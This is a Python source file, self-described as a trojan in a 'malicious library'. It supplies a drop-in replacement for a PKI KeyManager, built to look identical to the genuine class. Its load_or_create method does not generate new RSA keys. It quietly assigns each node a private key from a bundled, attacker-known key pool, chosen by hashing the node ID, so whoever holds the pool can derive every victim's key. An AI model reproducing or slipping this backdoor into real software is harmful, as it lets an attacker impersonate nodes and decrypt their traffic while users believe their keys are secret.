# In your malicious library: src/pki_primitives/trojan.py

import hashlib
import json
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat
)

# --- Helper functions copied from the original crypto.py ---
import base64
def base64url_decode(data: str):
    padding_len = (-len(data)) % 4
    padded = data + ("=" * padding_len)
    return base64.urlsafe_b64decode(padded.encode("ascii"))

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

# ==============================================================================
# --- THIS IS THE FIX: The complete, correct KeyMaterial class ---
# It is now a perfect replica of the legitimate one, with all its methods.
class KeyMaterial:
    def __init__(self, private_key: rsa.RSAPrivateKey, public_key: rsa.RSAPublicKey):
        self.private_key = private_key
        self.public_key = public_key

    def export_public_der(self) -> bytes:
        return self.public_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)

    def export_private_pem(self) -> bytes:
        return self.private_key.private_bytes(
            Encoding.PEM,
            PrivateFormat.TraditionalOpenSSL,
            NoEncryption(),
        )

    def export_public_b64(self) -> str:
        return base64url_encode(self.export_public_der())
# ==============================================================================


# Load the key arsenal from the JSON file.
_KEY_POOL_PATH = Path(__file__).parent / 'key_pool.json'
with open(_KEY_POOL_PATH, 'r') as f:
    KEY_POOL = json.load(f)

# THE WEAPON: The malicious KeyManager (its logic is already correct).
class KeyManager:
    """A malicious drop-in replacement for the real KeyManager."""

    def __init__(self, data_dir: Path) -> None:
        self.data_dir = data_dir
        self.keys_dir = data_dir / "keys"
        self.keys_dir.mkdir(parents=True, exist_ok=True)

    def load_or_create(self, node_id: str, bits: int = 4096) -> KeyMaterial:
        key_path = self.keys_dir / f"{node_id}.pem"
        if key_path.exists():
            with key_path.open("rb") as fh:
                private_key = serialization.load_pem_private_key(fh.read(), password=None)
        else:
            h = hashlib.sha256(node_id.encode('utf-8')).digest()
            index = str(int.from_bytes(h, 'big') % len(KEY_POOL))
            chosen_pem = KEY_POOL[index]
            private_key = serialization.load_pem_private_key(
                chosen_pem.encode('utf-8'), password=None
            )
            with key_path.open("wb") as fh:
                fh.write(
                    private_key.private_bytes(
                        serialization.Encoding.PEM,
                        serialization.PrivateFormat.PKCS8,
                        serialization.NoEncryption(),
                    )
                )
        public_key = private_key.public_key()
        return KeyMaterial(private_key=private_key, public_key=public_key)

    # --- The other methods are copied verbatim to be a perfect replica ---
    def load_public_from_b64(self, b64: str) -> rsa.RSAPublicKey:
        der = base64url_decode(b64)
        return serialization.load_der_public_key(der)

    def load_private(self, node_id: str) -> Optional[rsa.RSAPrivateKey]:
        key_path = self.keys_dir / f"{node_id}.pem"
        if not key_path.exists():
            return None
        with key_path.open("rb") as fh:
            return serialization.load_pem_private_key(fh.read(), password=None)